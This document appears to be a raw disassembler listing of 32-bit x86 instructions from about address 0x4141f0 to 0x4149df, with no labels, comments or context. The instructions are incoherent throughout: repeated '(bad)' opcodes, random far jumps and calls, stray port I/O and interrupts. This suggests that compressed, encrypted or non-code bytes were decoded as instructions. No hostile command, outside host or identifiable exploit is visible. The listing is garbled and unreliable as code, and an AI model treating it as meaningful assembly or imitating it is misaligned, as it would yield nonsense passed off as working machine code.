  4141f0:	xlat   BYTE PTR ds:[ebx]
  4141f1:	mov    esp,0x55deeeab
  4141f6:	mov    dh,0x64
  4141f8:	xchg   esp,eax
  4141f9:	leave  
  4141fa:	sub    eax,0xabc4af
  4141ff:	add    BYTE PTR [edx+0x4a8a275a],bh
  414205:	jne    0x4141d0
  414207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414208:	mov    ecx,0xbdb72e10
  41420d:	mov    ecx,0xce48d1
  414212:	add    BYTE PTR [ebx-0xc902818],al
  414218:	loop   0x4141e0
  41421a:	dec    esi
  41421b:	xchg   DWORD PTR [ecx-0x4931ab13],ebp
  414221:	jno    0x4141b6
  414223:	dec    edx
  414224:	and    al,0xfd
  414226:	dec    ebx
  414227:	in     eax,0x1d
  414229:	sbb    DWORD PTR [ecx+eiz*2+0x7101e5b3],0xffffff80
  414231:	jmp    0x4d5e4236
  414236:	mov    edi,0xecf12225
  41423b:	icebp  
  41423c:	xchg   edx,eax
  41423d:	dec    edi
  41423e:	jg     0x414273
  414240:	lds    esp,FWORD PTR [esi-0x380bfcfb]
  414246:	(bad)  
  414247:	adc    ah,BYTE PTR [edi+ebx*8]
  41424a:	mov    dh,0xde
  41424c:	ret    
  41424d:	cld    
  41424e:	xchg   edi,eax
  41424f:	add    eax,0xbf1ce1b8
  414254:	ret    
  414255:	out    dx,al
  414256:	shl    DWORD PTR [ecx-0x16],cl
  414259:	out    0x54,al
  41425b:	out    dx,al
  41425c:	adc    al,0xc5
  41425e:	xchg   edx,eax
  41425f:	push   0x84113da5
  414264:	sldt   WORD PTR [eax]
  414267:	out    dx,al
  414268:	inc    esp
  414269:	sahf   
  41426a:	add    BYTE PTR [eax],al
  41426c:	lahf   
  41426d:	mov    dl,0x13
  41426f:	mov    bl,BYTE PTR [esi+0x6560fd54]
  414275:	xor    esp,DWORD PTR [ecx+0x1e]
  414278:	or     BYTE PTR [edi-0x53110000],al
  41427e:	push   ss
  41427f:	cli    
  414280:	mov    dh,BYTE PTR [edx]
  414282:	rcr    BYTE PTR [ebx+0x941265f],1
  414288:	xor    eax,0xb508
  41428d:	sub    esp,esi
  41428f:	push   ebx
  414290:	gs xchg esp,eax
  414292:	push   ds
  414293:	lahf   
  414294:	sbb    ch,BYTE PTR [esi-0x45]
  414297:	pop    ecx
  414298:	fld    QWORD PTR [edi+edx*8]
  41429b:	add    BYTE PTR [eax],al
  41429d:	enter  0xa7,0x0
  4142a1:	cmp    DWORD PTR [edi],0xabcccd2d
  4142a7:	add    BYTE PTR [eax],al
  4142a9:	daa    
  4142aa:	std    
  4142ab:	cmp    edi,edi
  4142ad:	push   es
  4142ae:	(bad)  
  4142af:	cmp    eax,0xf184c1
  4142b4:	add    BYTE PTR [edx+0x48c],dl
  4142ba:	ficom  DWORD PTR [edx-0x59]
  4142bd:	jne    0x414320
  4142bf:	push   edi
  4142c0:	iret   
  4142c1:	in     al,dx
  4142c2:	mov    ah,0x6b
  4142c4:	lods   al,BYTE PTR ds:[esi]
  4142c5:	imul   esi,DWORD PTR [esi+ebx*8-0x46],0x29
  4142ca:	mov    WORD PTR [eax],fs
  4142cc:	add    BYTE PTR [eax],al
  4142ce:	addr16 je 0x41425d
  4142d1:	or     eax,DWORD PTR [eax]
  4142d3:	add    BYTE PTR [esi-0x75],ah
  4142d6:	and    ecx,edi
  4142d8:	dec    ebp
  4142d9:	or     cl,bh
  4142db:	add    BYTE PTR [eax],al
  4142dd:	arpl   WORD PTR [ecx-0x71],di
  4142e0:	sbb    al,BYTE PTR [ebp-0x1a926869]
  4142e6:	retf   0x8d07
  4142e9:	jp     0x4142ff
  4142eb:	sub    al,0x3f
  4142ed:	dec    esp
  4142ee:	push   0x0
  4142f0:	add    BYTE PTR [ecx-0x8],bl
  4142f3:	test   DWORD PTR [ebx+0x9500],edi
  4142f9:	pop    eax
  4142fa:	inc    edi
  4142fb:	cmc    
  4142fc:	push   ss
  4142fd:	int    0xb2
  4142ff:	mov    BYTE PTR [edx+0x0],ah
  414302:	add    BYTE PTR [edx-0x4a21b622],dh
  414308:	clc    
  414309:	fwait
  41430a:	sti    
  41430b:	push   edx
  41430c:	stos   BYTE PTR es:[edi],al
  41430d:	pop    eax
  41430e:	ret    
  41430f:	stos   BYTE PTR es:[edi],al
  414310:	(bad)  
  414311:	xchg   BYTE PTR [ecx-0x7c],cl
  414314:	xchg   esp,eax
  414315:	add    BYTE PTR [eax],al
  414317:	loope  0x4142c3
  414319:	mov    edi,0x7ac39239
  41431e:	xchg   esp,eax
  41431f:	xlat   BYTE PTR ds:[ebx]
  414320:	dec    eax
  414321:	push   ss
  414322:	add    BYTE PTR [eax],al
  414324:	cld    
  414325:	push   eax
  414326:	inc    edx
  414327:	push   esp
  414328:	jne    0x414350
  41432a:	xchg   ecx,eax
  41432b:	and    BYTE PTR [ebx+0xbb4c],cl
  414331:	sti    
  414332:	adc    BYTE PTR ss:[ebx+0xc3cc],ah
  414339:	(bad)  
  41433a:	test   al,0xfa
  41433c:	jg     0x414388
  41433e:	cmp    DWORD PTR ds:0xfc2df,esp
  414344:	mov    BYTE PTR [eax],al
  414346:	add    BYTE PTR [ecx-0x1f],al
  414349:	pusha  
  41434a:	mov    bh,0x36
  41434c:	(bad)  
  41434d:	fld    DWORD PTR [eax]
  41434f:	add    BYTE PTR [ecx-0x61],dh
  414352:	mov    dl,0x34
  414354:	shl    BYTE PTR [eax-0x65050000],0x3c
  41435b:	sbb    bh,BYTE PTR [esi-0x7]
  41435e:	test   DWORD PTR [esi+0x2a],0x8c017b64
  414365:	add    BYTE PTR ds:[eax],al
  414368:	nop
  414369:	aam    0xad
  41436b:	retf   
  41436c:	mov    WORD PTR [ebx+0x0],?
  41436f:	add    BYTE PTR [ecx+ecx*1-0x69],bl
  414373:	xor    DWORD PTR [esi+edx*8-0x3a],edx
  414377:	and    eax,0x85e8327a
  41437c:	outs   dx,DWORD PTR ds:[esi]
  41437d:	in     al,0x0
  41437f:	adc    al,BYTE PTR [eax]
  414381:	add    BYTE PTR ds:0x41f81043,cl
  414387:	dec    esp
  414388:	jns    0x41438a
  41438a:	add    BYTE PTR [ebx-0x5],cl
  41438d:	mov    edi,0x9f1af877
  414392:	(bad)  
  414393:	aam    0x0
  414395:	add    ah,ch
  414397:	dec    ecx
  414398:	imul   ecx,DWORD PTR [edi-0x66a861a3],0xffffffe8
  41439f:	(bad)  
  4143a0:	lds    esp,FWORD PTR [eax-0x67]
  4143a3:	mov    bh,0x8e
  4143a5:	out    dx,al
  4143a6:	rcl    DWORD PTR [eax+0x64],cl
  4143a9:	cmp    DWORD PTR ds:0xb8d6307b,0xf276418d
  4143b3:	push   ebp
  4143b4:	mov    ds:0x17eb1ac1,al
  4143b9:	fwait
  4143ba:	leave  
  4143bb:	inc    ebp
  4143bc:	ins    BYTE PTR es:[edi],dx
  4143bd:	jae    0x414388
  4143bf:	push   ebx
  4143c0:	dec    edx
  4143c1:	dec    ebp
  4143c2:	int3   
  4143c3:	or     eax,0x6c720000
  4143c8:	jle    0x4143f4
  4143ca:	mov    eax,ds:0x88bec974
  4143cf:	mov    ebx,0x615c0000
  4143d4:	cdq    
  4143d5:	(bad)  
  4143d6:	and    bh,ah
  4143d8:	sbb    eax,0xe4ef29af
  4143dd:	adc    cl,0x95
  4143e0:	mov    cl,0x72
  4143e2:	fimul  WORD PTR ds:0xcf21934f
  4143e8:	add    ecx,DWORD PTR [edx]
  4143ea:	rcl    DWORD PTR [ecx+esi*1+0xb84ce2],0x0
  4143f2:	out    dx,eax
  4143f3:	xchg   ebx,eax
  4143f4:	pop    ss
  4143f5:	adc    eax,0xc4cf1e16
  4143fa:	popf   
  4143fb:	add    BYTE PTR [eax],al
  4143fd:	rol    DWORD PTR [edi+0x44],cl
  414400:	xor    al,BYTE PTR [eax]
  414402:	add    BYTE PTR [ebx-0x4a250096],bl
  414408:	addr16 mov eax,0x2202590b
  41440e:	hlt    
  41440f:	loopne 0x4143de
  414411:	int3   
  414412:	mov    bh,0x0
  414414:	add    BYTE PTR [ebp+edi*1-0x14],ch
  414418:	test   al,0x76
  41441a:	(bad)  
  41441b:	out    dx,al
  41441c:	ret    0xe58
  41441f:	in     eax,0xa9
  414421:	call   0xe88a806d
  414426:	or     ebx,edi
  414428:	jmp    0xcc0362b3
  41442d:	mov    bx,0xe6b9
  414431:	bnd jmp 0x414454
  414434:	jns    0x4143f0
  414436:	jno    0x414472
  414438:	and    BYTE PTR [ebx+edi*8],ch
  41443b:	inc    edx
  41443c:	xchg   DWORD PTR [ebx+0x3f],ebx
  41443f:	je     0x4144a7
  414441:	jo     0x41446a
  414443:	mov    gs,WORD PTR [eax-0x2daf36e4]
  414449:	xlat   BYTE PTR ds:[ebx]
  41444a:	mov    ch,0x20
  41444c:	dec    eax
  41444d:	lods   eax,DWORD PTR ds:[esi]
  41444e:	add    BYTE PTR [eax],al
  414450:	mov    ah,0x17
  414452:	fadd   QWORD PTR [eax+0x36]
  414455:	add    BYTE PTR [eax],al
  414457:	adc    dl,cl
  414459:	inc    ecx
  41445a:	inc    edi
  41445b:	xor    esi,ecx
  41445d:	push   edx
  41445e:	dec    eax
  41445f:	aam    0x0
  414461:	add    BYTE PTR [ebx],cl
  414463:	call   0xc00:0x594c89
  41446a:	outs   dx,DWORD PTR ds:[esi]
  41446b:	add    BYTE PTR [eax],al
  41446d:	leave  
  41446e:	jge    0x414461
  414470:	and    eax,0xb7ad2a3c
  414475:	stos   BYTE PTR es:[edi],al
  414476:	in     eax,0xc9
  414478:	ds mov al,0x5b
  41447b:	lea    ecx,[ecx]
  41447d:	xchg   ebp,eax
  41447e:	mov    dx,0x3f1d
  414482:	arpl   WORD PTR [edi],bx
  414484:	movq   QWORD PTR [ecx],mm7
  414487:	ds mov al,0xe3
  41448a:	mov    esi,0x4e05c663
  41448f:	stc    
  414490:	cmp    al,0x4b
  414492:	mov    bh,0x7e
  414494:	push   ebp
  414495:	ror    DWORD PTR [edx+0x3c],1
  414498:	(bad)  
  414499:	xor    edi,esi
  41449b:	dec    edi
  41449c:	sub    al,BYTE PTR [eax+esi*2+0x0]
  4144a0:	add    BYTE PTR ds:0x3e288e55,bl
  4144a6:	idiv   DWORD PTR [eax+edx*1-0x5815a990]
  4144ad:	cmc    
  4144ae:	mov    es,WORD PTR [edx+0x3a5cb45e]
  4144b4:	leave  
  4144b5:	icebp  
  4144b6:	sub    eax,0xf43ab025
  4144bb:	adc    ebx,eax
  4144bd:	jbe    0x414518
  4144bf:	pop    ebx
  4144c0:	push   ss
  4144c1:	xchg   ebx,edi
  4144c3:	mov    DWORD PTR [ebp-0x4c7c9c5b],edx
  4144c9:	clc    
  4144ca:	xchg   ebp,eax
  4144cb:	push   ss
  4144cc:	adc    DWORD PTR [edi-0x56bf66af],eax
  4144d2:	add    BYTE PTR [eax],al
  4144d4:	add    BYTE PTR [edi],dh
  4144d6:	add    BYTE PTR [eax],al
  4144d8:	xchg   DWORD PTR [esi],edx
  4144da:	xchg   edi,eax
  4144db:	addr16 jmp 0x9c0b:0x8d9434fa
  4144e3:	mulps  xmm2,XMMWORD PTR ds:[edx]
  4144e7:	fld    QWORD PTR [eax+0x7600006a]
  4144ed:	cmp    esp,DWORD PTR [edi+0x77]
  4144f0:	cmp    DWORD PTR gs:[esi+0xb934186],0xbd7d9360
  4144fb:	mov    esi,0x3708e4
  414500:	add    BYTE PTR [ebx-0x54],bh
  414503:	jp     0x41455c
  414505:	and    eax,0xf3514e1d
  41450a:	push   eax
  41450b:	(bad)  
  41450c:	xor    bl,bl
  41450e:	fnstsw WORD PTR [eax]
  414510:	js     0x4144b4
  414512:	add    BYTE PTR [edx+0x44],0x50
  414516:	add    BYTE PTR [eax],al
  414518:	ins    DWORD PTR es:[edi],dx
  414519:	mov    ds:0xdede16da,eax
  41451e:	inc    ebx
  41451f:	sub    al,0x4
  414521:	xor    BYTE PTR [eax],al
  414523:	add    cl,dl
  414525:	bound  edx,QWORD PTR [ebp+0x1bc4870e]
  41452b:	add    BYTE PTR [eax],al
  41452d:	or     al,al
  41452f:	add    BYTE PTR [eax],al
  414531:	ffreep st(6)
  414533:	gs add al,0xb2
  414536:	add    BYTE PTR [eax],al
  414538:	gs push eax
  41453a:	shr    BYTE PTR fs:[ecx+esi*8],1
  41453e:	pop    ds
  41453f:	(bad)  
  414540:	mov    ds:0x73eeee4f,eax
  414545:	aam    0xd1
  414547:	and    cl,cl
  414549:	iret   
  41454a:	and    edi,DWORD PTR [ecx+ebx*4-0x5a]
  41454e:	bnd jbe 0x414524
  414551:	dec    ebp
  414552:	mov    bl,0xc9
  414554:	or     al,al
  414556:	mov    ebx,0xf5500000
  41455b:	jp     0x414522
  41455d:	push   esp
  41455e:	dec    eax
  41455f:	or     eax,DWORD PTR [eax]
  414561:	add    BYTE PTR [edx+eiz*1-0x45],dh
  414565:	xlat   BYTE PTR ds:[ebx]
  414566:	jae    0x414598
  414568:	fbstp  TBYTE PTR [edi]
  41456a:	cld    
  41456b:	inc    edi
  41456c:	mov    ah,BYTE PTR [eax-0x7b9991d7]
  414572:	test   BYTE PTR [eax],0x0
  414575:	pusha  
  414576:	or     DWORD PTR [ecx-0x2],edx
  414579:	adc    DWORD PTR [edx+0x67cd6e5a],eax
  41457f:	pop    edi
  414580:	scas   eax,DWORD PTR es:[edi]
  414581:	repz mov eax,0x97c8addd
  414587:	add    BYTE PTR [eax],al
  414589:	fld    DWORD PTR [eax+0x71]
  41458c:	add    BYTE PTR [eax],al
  41458e:	leave  
  41458f:	xor    DWORD PTR [eax-0x3320dfaa],ebp
  414595:	or     DWORD PTR [eax],eax
  414597:	add    bh,dl
  414599:	cmp    al,ah
  41459b:	and    eax,0x2be90000
  4145a0:	(bad)  
  4145a1:	pop    ecx
  4145a2:	add    DWORD PTR [ecx+0x8788],0x7e6edb90
  4145ac:	dec    ecx
  4145ad:	xor    eax,0xa46c215c
  4145b2:	mov    esi,0x7e83b6ba
  4145b7:	jns    0x41459d
  4145b9:	cmp    al,0xf
  4145bb:	(bad)  
  4145bc:	fld    QWORD PTR [eax]
  4145be:	add    ah,cl
  4145c0:	stos   DWORD PTR es:[edi],eax
  4145c1:	add    BYTE PTR [eax],al
  4145c3:	inc    esp
  4145c4:	out    0x0,eax
  4145c6:	add    BYTE PTR [eax],dh
  4145c8:	mov    edi,DWORD PTR [eax+0x1d064cb]
  4145ce:	das    
  4145cf:	scas   eax,DWORD PTR es:[edi]
  4145d0:	jns    0x41462c
  4145d2:	std    
  4145d3:	push   ecx
  4145d4:	cmp    BYTE PTR [eax],ch
  4145d6:	jo     0x414565
  4145d8:	jo     0x4145d8
  4145da:	mov    edx,0xccb91624
  4145df:	jecxz  0x4145e1
  4145e1:	add    dl,ch
  4145e3:	stc    
  4145e4:	mov    bh,0xff
  4145e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145e7:	rol    BYTE PTR [ebx+0x6c00000],0x0
  4145ee:	add    BYTE PTR [ebx-0x6f],ah
  4145f1:	aam    0x4a
  4145f3:	(bad)  
  4145f5:	xchg   ebp,eax
  4145f6:	and    eax,0xd50ba045
  4145fb:	leave  
  4145fc:	dec    edx
  4145fd:	sub    cl,BYTE PTR [ecx]
  4145ff:	mov    ebp,0xdd7b4b21
  414604:	jmp    0x12dc:0x6d9fad99
  41460b:	sar    edx,1
  41460d:	or     eax,0x4f32603b
  414612:	push   ecx
  414613:	out    dx,eax
  414614:	int    0x61
  414616:	outs   dx,BYTE PTR ds:[esi]
  414617:	jnp    0x4145c1
  414619:	mov    edx,0x5222ec63
  41461e:	int3   
  41461f:	dec    edi
  414620:	add    BYTE PTR [eax],al
  414622:	scas   al,BYTE PTR es:[edi]
  414623:	xchg   BYTE PTR [esi+0x1b],bh
  414626:	sbb    bh,BYTE PTR [edx-0x1324c973]
  41462c:	stos   DWORD PTR es:[edi],eax
  41462d:	loope  0x4145c0
  41462f:	cmp    DWORD PTR [eax-0x12],edi
  414632:	dec    edi
  414633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414634:	sti    
  414635:	adc    esp,DWORD PTR [eax+0x6771e661]
  41463b:	sub    eax,0xb739aa86
  414640:	add    al,0x42
  414642:	add    BYTE PTR [eax],al
  414644:	adc    DWORD PTR [edx-0x2c],esi
  414647:	sub    eax,0x897ed030
  41464c:	addr16 test eax,0x2dc4
  414652:	js     0x41465c
  414654:	lods   al,BYTE PTR ds:[esi]
  414655:	add    BYTE PTR [eax],al
  414657:	mov    ?,WORD PTR [esi+0x21]
  41465a:	ins    DWORD PTR es:[edi],dx
  41465b:	mov    ebp,0x363ca66a
  414660:	push   es
  414661:	shr    DWORD PTR [ebx+0x5],cl
  414664:	adc    BYTE PTR [eax+eax*1+0x0],0x72
  414669:	dec    esi
  41466a:	jbe    0x41466f
  41466c:	mov    cl,0xd8
  41466e:	inc    edi
  41466f:	xlat   BYTE PTR ds:[ebx]
  414670:	mov    ds:0x10c4cf95,al
  414675:	add    BYTE PTR [eax],al
  414677:	dec    ecx
  414678:	xor    DWORD PTR [esi+0x6c],esp
  41467b:	pop    es
  41467c:	(bad)  
  41467d:	arpl   WORD PTR [ebx+0xbee8e22],di
  414683:	pop    esp
  414684:	popa   
  414685:	ins    DWORD PTR es:[edi],dx
  414686:	or     DWORD PTR [eax],ebx
  414688:	retf   
  414689:	loope  0x4146bd
  41468b:	xchg   esp,eax
  41468c:	not    edi
  41468e:	pop    ebx
  41468f:	push   0x20
  414691:	rcl    BYTE PTR [esi-0x77],1
  414694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414695:	mov    esp,0x7d544722
  41469a:	arpl   ax,cx
  41469c:	jge    0x41469e
  41469e:	add    BYTE PTR [edi-0x43],bl
  4146a1:	sbb    eax,0xfa325845
  4146a6:	retf   
  4146a7:	das    
  4146a8:	mov    al,ds:0xd63771f
  4146ad:	adc    ebp,DWORD PTR [esi-0x19ffd690]
  4146b3:	add    BYTE PTR [eax],al
  4146b5:	out    dx,al
  4146b6:	je     0x41470d
  4146b8:	or     al,0x7f
  4146ba:	add    BYTE PTR [eax],al
  4146bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146bd:	cmp    eax,0x6a60a8b3
  4146c2:	in     al,dx
  4146c3:	xchg   edx,eax
  4146c4:	int    0x9b
  4146c6:	ficom  WORD PTR [ecx+0x47]
  4146c9:	add    BYTE PTR ds:[ebp+0x0],ah
  4146cd:	add    ch,dl
  4146cf:	xchg   esi,eax
  4146d0:	mov    al,0x16
  4146d2:	lea    ebx,[edi+0x5b]
  4146d5:	adc    DWORD PTR ds:[ebp+0x6a],0xaf8c
  4146dd:	pop    ebx
  4146de:	and    edx,DWORD PTR [ecx]
  4146e0:	daa    
  4146e1:	mov    ds:0x6913262f,eax
  4146e6:	and    ebp,DWORD PTR [esi+eiz*4]
  4146e9:	xor    ch,BYTE PTR ds:[ebx+0x327c6dcd]
  4146f0:	int3   
  4146f1:	xor    al,BYTE PTR [eax]
  4146f3:	add    dh,bl
  4146f5:	mov    cs,WORD PTR [ebp+0xd7c0d5]
  4146fb:	add    bl,cl
  4146fd:	shl    BYTE PTR [ebx],0x0
  414700:	add    BYTE PTR [eax-0x52],cl
  414703:	add    BYTE PTR [eax],al
  414705:	xchg   BYTE PTR [eax-0x5d],dh
  414708:	add    ecx,DWORD PTR [edi+0x17ef67ec]
  41470e:	cwde   
  41470f:	popf   
  414710:	xor    DWORD PTR [edi+0x19],ecx
  414713:	mov    ecx,0x1e661e10
  414718:	or     ebx,DWORD PTR [esi-0x7d3a8c0b]
  41471e:	cwde   
  41471f:	stos   BYTE PTR es:[edi],al
  414720:	fs push es
  414722:	mov    eax,ds:0xcb3d23ee
  414727:	add    eax,0xff0c
  41472c:	mov    ds:0x6bcb2bd3,eax
  414731:	sbb    ecx,DWORD PTR [eax]
  414733:	or     al,0x0
  414735:	add    BYTE PTR [eax-0x3f],bh
  414738:	and    DWORD PTR [edi+0x22238aa4],ebx
  41473e:	pop    esp
  41473f:	mov    BYTE PTR [edx+0x0],dl
  414742:	add    BYTE PTR [eax],bh
  414744:	sub    edx,DWORD PTR ds:0x79348931
  41474a:	pop    ds
  41474b:	cmp    eax,0x6aaf6437
  414750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414751:	jle    0x41477d
  414753:	call   0xc809:0x15d7db05
  41475a:	pop    edx
  41475b:	add    BYTE PTR [eax],al
  41475d:	adc    dl,al
  41475f:	jl     0x41473d
  414761:	rcl    BYTE PTR [ebx-0x6a],cl
  414764:	xor    al,BYTE PTR [ebx+0xa700ac]
  41476a:	add    BYTE PTR [eax-0x6ed56248],bl
  414770:	aaa    
  414771:	jmp    0x41474c
  414773:	and    eax,0x181cbc6d
  414778:	scas   al,BYTE PTR es:[edi]
  414779:	nop
  41477a:	mov    ds,WORD PTR [esi]
  41477c:	call   0x4958f425
  414781:	pop    ds
  414782:	push   ds
  414783:	pop    ebx
  414784:	mov    ds:0xa4ead64,eax
  414789:	mov    al,ds:0x9df1a0a3
  41478e:	push   eax
  41478f:	pusha  
  414790:	dec    esi
  414791:	cdq    
  414792:	add    BYTE PTR [ebx+eiz*8],0x0
  414796:	add    BYTE PTR [edi+0x2bb45831],dl
  41479c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41479d:	ins    BYTE PTR es:[edi],dx
  41479e:	xor    eax,0xcccae781
  4147a3:	mov    edi,0x17080000
  4147a8:	add    BYTE PTR [eax],al
  4147aa:	sbb    DWORD PTR [ecx-0x62484b05],0xb3dfdb59
  4147b4:	imul   ebp,edi,0x979d16f9
  4147ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147bb:	xchg   esp,eax
  4147bc:	xchg   ebp,eax
  4147bd:	aad    0x2b
  4147bf:	cmp    cl,BYTE PTR [edx+0x2e54d6dc]
  4147c5:	xchg   esi,eax
  4147c6:	mov    eax,ds:0xdf15f13
  4147cb:	lea    esi,[edi]
  4147cd:	jmp    0xfd96:0x1df220b9
  4147d4:	mov    ch,0x9
  4147d6:	in     eax,0x17
  4147d8:	mov    edi,0x93b6d49f
  4147dd:	int    0x1
  4147df:	add    dl,0xc8
  4147e2:	lods   eax,DWORD PTR ds:[esi]
  4147e3:	add    BYTE PTR [eax],al
  4147e5:	mov    ?,ebp
  4147e7:	(bad)  [esi+0x76]
  4147ea:	mov    ebp,0x623c1c49
  4147ef:	pop    ds
  4147f0:	ins    BYTE PTR es:[edi],dx
  4147f1:	and    DWORD PTR [ecx+0x65766785],edi
  4147f7:	add    al,0xe1
  4147f9:	add    BYTE PTR [eax],al
  4147fb:	repz dec ebp
  4147fd:	(bad)  
  4147fe:	jg     0x4147fa
  414800:	inc    ebx
  414801:	jle    0x414827
  414803:	xor    ebx,DWORD PTR [ecx+0xd]
  414806:	mov    ebp,0xf2e43dd9
  41480b:	push   edi
  41480c:	xor    dl,BYTE PTR [edi+0x4c]
  41480f:	rol    DWORD PTR [eax],cl
  414811:	add    BYTE PTR [esi+0x269c987e],dh
  414817:	mov    ?,WORD PTR [ecx]
  414819:	(bad)  
  41481a:	sub    al,0x29
  41481c:	lea    ebx,[ecx+0x99c4]
  414822:	shl    esp,0xab
  414825:	jae    0x414878
  414827:	sbb    ah,bh
  414829:	jns    0x4147c1
  41482b:	push   0x2b
  41482d:	jae    0x414834
  41482f:	fdivr  QWORD PTR [ebp+ebp*2+0x37cc0fdb]
  414836:	add    BYTE PTR [eax],al
  414838:	fs jne 0x414885
  41483b:	or     ecx,ecx
  41483d:	cld    
  41483e:	test   eax,0x2e9b41ce
  414843:	call   0x7e7f121c
  414848:	pop    ecx
  414849:	or     ecx,DWORD PTR [ebx+edi*1+0x7f330000]
  414850:	repz and al,0xa9
  414853:	fnstcw WORD PTR [esi+eax*2+0x66]
  414857:	stos   BYTE PTR es:[edi],al
  414858:	pop    edx
  414859:	push   edi
  41485a:	in     al,dx
  41485b:	sub    DWORD PTR [ebp-0x6b],ebx
  41485e:	enter  0xb0,0x0
  414862:	pop    ds
  414863:	xchg   edi,eax
  414864:	cmp    eax,0x1892980a
  414869:	mov    es:0x983098ca,eax
  41486f:	cmp    ah,ch
  414871:	jno    0x414898
  414873:	mov    ebp,gs
  414875:	add    BYTE PTR [eax],al
  414877:	adc    dh,cl
  414879:	bound  eax,QWORD PTR ds:0xf21b22d
  41487f:	push   ebx
  414880:	pop    eax
  414881:	fistp  WORD PTR [edi]
  414883:	stc    
  414884:	clc    
  414885:	hlt    
  414886:	mov    cl,0xe4
  414888:	push   DWORD PTR [ebx-0x31]
  41488b:	add    ch,cl
  41488d:	add    BYTE PTR [eax],al
  41488f:	ds in  al,dx
  414891:	sub    edx,ebx
  414893:	data16 mov gs,WORD PTR [ebx+eax*1-0x5d499354]
  41489b:	jae    0x414869
  41489d:	cld    
  41489e:	add    BYTE PTR [eax],al
  4148a0:	gs ja  0x4148bb
  4148a3:	pushf  
  4148a4:	xchg   edi,eax
  4148a5:	sub    BYTE PTR [edx+0x7f],al
  4148a8:	xchg   esi,ebp
  4148aa:	rcr    DWORD PTR [ebx-0x2067fcd1],1
  4148b0:	sub    ah,BYTE PTR [esi]
  4148b2:	retf   0x812b
  4148b5:	int    0x2b
  4148b7:	inc    eax
  4148b8:	xchg   ecx,eax
  4148b9:	add    BYTE PTR [eax],al
  4148bb:	(bad)  
  4148bc:	pop    esp
  4148bd:	and    ebx,ecx
  4148bf:	int3   
  4148c0:	retf   
  4148c1:	add    BYTE PTR [eax],al
  4148c3:	jle    0x4148b2
  4148c5:	repnz arpl WORD PTR [eax+0x7e26f32e],bx
  4148cc:	adc    BYTE PTR [ebx+edx*2],cl
  4148cf:	add    BYTE PTR [eax],al
  4148d1:	xchg   edx,eax
  4148d2:	jmp    0x138:0x9a11
  4148d8:	xchg   ecx,eax
  4148d9:	push   0x778c9682
  4148de:	add    BYTE PTR [eax],al
  4148e0:	lds    eax,FWORD PTR [eax-0x28ffff9e]
  4148e6:	cmp    ah,BYTE PTR [ebx-0x14]
  4148e9:	mov    DWORD PTR [eax+0x1b0893],ebx
  4148ef:	add    BYTE PTR [ecx],dl
  4148f1:	or     DWORD PTR [ebx-0x75],ebx
  4148f4:	test   eax,0x5ba3361d
  4148f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148fa:	add    al,0x44
  4148fc:	add    BYTE PTR [eax],al
  4148fe:	and    BYTE PTR [esi-0x64],cl
  414901:	cmp    esi,DWORD PTR [ecx+0x540d7912]
  414907:	mov    ds:0x31e86890,eax
  41490c:	clc    
  41490d:	ret    
  41490e:	clc    
  41490f:	fsubr  DWORD PTR [esi-0xe]
  414912:	aaa    
  414913:	fdivr  st(3),st
  414915:	ret    0x994b
  414918:	ds jbe 0x4148a1
  41491b:	lods   al,BYTE PTR ds:[esi]
  41491c:	xchg   BYTE PTR [edx],al
  41491e:	xor    BYTE PTR [ebx],bl
  414920:	sub    ebx,esp
  414922:	(bad)  
  414923:	xchg   ebp,eax
  414924:	xchg   edi,eax
  414925:	daa    
  414926:	cmc    
  414927:	aas    
  414928:	daa    
  414929:	sahf   
  41492a:	cmp    ebx,DWORD PTR [eax]
  41492c:	mov    esi,0x654fd571
  414931:	int    0x5
  414933:	cs add eax,0x2b4e799e
  414939:	xor    DWORD PTR [ecx-0x1dd36eaf],edi
  41493f:	test   al,0x28
  414941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414942:	jmp    0xfdab:0x9ccf285d
  414949:	stc    
  41494a:	push   esi
  41494b:	push   esi
  41494c:	pop    ss
  41494d:	cmp    ecx,esp
  41494f:	aad    0xdc
  414951:	sub    bh,0x0
  414954:	add    BYTE PTR [ecx-0x4a],ah
  414957:	in     eax,dx
  414958:	jl     0x414902
  41495a:	and    cl,BYTE PTR [ecx]
  41495c:	iret   
  41495d:	test   BYTE PTR [esi-0x1ce90000],bl
  414963:	xchg   BYTE PTR [ebp+0xd],bl
  414966:	add    eax,0x8f0000c4
  41496c:	lock shl DWORD PTR [edx+0x3080fd59],0x0
  414974:	add    BYTE PTR [edi],bl
  414976:	in     al,0xca
  414978:	lahf   
  414979:	loope  0x4149ed
  41497b:	in     al,dx
  41497c:	cmc    
  41497d:	daa    
  41497e:	in     al,0x8
  414980:	test   BYTE PTR [eax],al
  414982:	add    BYTE PTR ds:0x440573e0,bh
  414988:	imul   eax,DWORD PTR [eax],0x5b1ab900
  41498e:	js     0x4149b7
  414990:	add    al,0xbc
  414992:	add    BYTE PTR [eax],al
  414994:	jb     0x4149a4
  414996:	adc    dh,BYTE PTR [ecx]
  414998:	mov    ebp,DWORD PTR ds:0x8b63a5d5
  41499e:	icebp  
  41499f:	push   ds
  4149a0:	push   ebp
  4149a1:	ficomp WORD PTR [edx+ebx*1-0xe]
  4149a5:	push   ebp
  4149a6:	jmp    0x5ea00364
  4149ab:	inc    edx
  4149ac:	(bad)  
  4149ad:	adc    al,BYTE PTR [esi-0x7a708683]
  4149b3:	dec    BYTE PTR [eax+edi*2+0x0]
  4149b7:	add    BYTE PTR [ecx],dl
  4149b9:	jp     0x414a29
  4149bb:	sti    
  4149bc:	push   esp
  4149bd:	ja     0x41497f
  4149bf:	pusha  
  4149c0:	add    BYTE PTR [eax],al
  4149c2:	cmp    eax,0x80942c14
  4149c7:	in     eax,dx
  4149c8:	add    BYTE PTR [eax],al
  4149ca:	mov    ebx,0x9ea5f4d4
  4149cf:	adc    al,0xf9
  4149d1:	add    eax,0x9c1128d3
  4149d6:	or     BYTE PTR [eax+eax*1+0x0],cl
  4149da:	adc    al,0x68
  4149dc:	inc    edi
  4149dd:	je     0x414961
  4149df:	nop
